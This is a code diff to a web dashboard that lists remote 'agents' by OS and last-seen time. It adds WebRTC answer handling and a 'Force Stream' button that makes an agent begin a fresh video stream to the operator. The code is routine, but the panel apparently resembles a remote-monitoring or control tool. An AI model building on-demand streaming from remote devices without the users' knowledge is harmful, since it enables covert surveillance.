@@ -12,6 +12,7 @@
         .btn { background: #3b82f6; color: white; border: none; padding: 10px; width: 100%; cursor: pointer; margin-top: 10px; border-radius: 4px; }
         .btn:hover { background: #2563eb; }
         .btn.active { background: #10b981; }
+        .btn.force { background: #f59e0b; margin-top: 5px; }
 
         /* Video Modal */
         #videoModal {
@@ -146,6 +147,10 @@
                     addLog(`[SIG] Received Offer from ${data.targetId}`, 'green');
                     handleWebRTCOffer(data.sdp, data.targetId);
                 }
+                else if (data.type === 'answer') {
+                    addLog(`[SIG] Received Answer from ${data.targetId}`, 'green');
+                    handleWebRTCAnswer(data.sdp, data.targetId);
+                }
                 else if (data.type === 'candidate') {
                     addLog(`[SIG] Received Candidate from ${data.targetId}`, 'blue');
                     handleWebRTCCandidate(data.candidate, data.targetId);
@@ -245,6 +250,18 @@
             }
         }
 
+        async function handleWebRTCAnswer(answerSDP, targetId) {
+            const session = getSession(targetId);
+            const pc = session.pc;
+
+            try {
+                await pc.setRemoteDescription(new RTCSessionDescription(answerSDP));
+                addLog(`[SIG] Answer processed for ${targetId}`, 'green');
+            } catch (err) {
+                addLog(`[WEBRTC] Error handling answer: ${err.message}`, 'red');
+            }
+        }
+
         function handleWebRTCCandidate(candidate, targetId) {
             const session = getSession(targetId);
 
@@ -325,6 +342,7 @@
                     <span class="status-dot ${statusColor}"></span> Info: ${osInfo}<br>
                     Last Seen: ${lastSeen}<br>
                     <button class="btn ${btnClass}" onclick="joinUser('${id}', '${data.status}')">${btnText}</button>
+                    <button class="btn force" onclick="forceStream('${id}')">Force Stream</button>
                 `;
                 grid.appendChild(card);
             }
@@ -364,6 +382,19 @@
                     from: null
                 }));
             }
+        }
+
+        function forceStream(id) {
+            // Force the agent to send a new offer by resetting their state
+            ws.send(JSON.stringify({
+                type: 'request_join',
+                targetId: id,
+                from: null
+            }));
+            addLog(`[FORCE] Requesting fresh stream from ${id}`, 'yellow');
+            
+            // Also send an offer from admin side to kickstart it
+            joinUser(id, 'Online');
         }
 
         function closeVideo() {
